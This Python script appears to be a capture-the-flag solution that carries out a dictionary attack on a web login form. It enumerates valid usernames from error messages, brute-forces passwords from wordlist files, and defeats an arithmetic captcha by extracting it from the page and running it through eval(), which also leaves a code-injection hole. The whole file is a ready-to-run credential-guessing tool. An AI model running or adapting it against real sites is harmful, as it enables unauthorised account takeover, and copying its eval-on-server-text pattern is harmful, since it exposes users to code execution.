#!/usr/bin/python3

# The task is to carry out a dictionary attack on a vulnerable
# website containing a login form, in order to obtain authorization
# to access the system and obtain the flag.

import requests
import argparse
import sys
import re


parser = argparse.ArgumentParser(description="Dictionary attack on a login form")
parser.add_argument(
    "IP_VICTIM", metavar="IP_VICTIM", help="Please enter <IP_VICTIM>", type=str
)
args = parser.parse_args()


IP_VICTIM = args.IP_VICTIM
url = f"http://{IP_VICTIM}/login"


def solve_captcha(captcha):
    return eval(captcha)


def find_captcha(response):
    pattern_captcha = r"\d+\s*[+\-*/]+\s*\d+\s*=\s*\?"
    try:
        return solve_captcha(re.search(pattern_captcha, response).group()[:-4])
    except:
        print(f"Captcha not found.")
        return None


def send_post(username, password, captcha=None):
    payload = {
        "username": username,
        "password": password,
    }
    if captcha:
        payload.update({"captcha": captcha})

    return requests.post(url, data=payload)


def login_attempt():
    for _ in range(100):
        response = send_post("admin", "1234pass")
        captcha = find_captcha(response.text)
        if captcha:
            return captcha


def get_credential(usernames, passwords):
    captcha = login_attempt()
    for username in usernames:
        response = send_post(username, "1234pass", captcha=captcha)
        captcha = find_captcha(response.text)
        if not "does not exist" in response.text:
            for password in passwords:
                response = send_post(username, password, captcha)
                captcha = find_captcha(response.text)
                if not "Invalid password" in response.text:
                    print(f"Successs! Username: {username} Password: {password}")
                    sys.exit(0)


if __name__ == "__main__":
    with open("usernames.txt", "r") as f:
        usernames = f.read().splitlines()

    with open("passwords.txt", "r") as f:
        passwords = f.read().splitlines()

    get_credential(usernames, passwords)
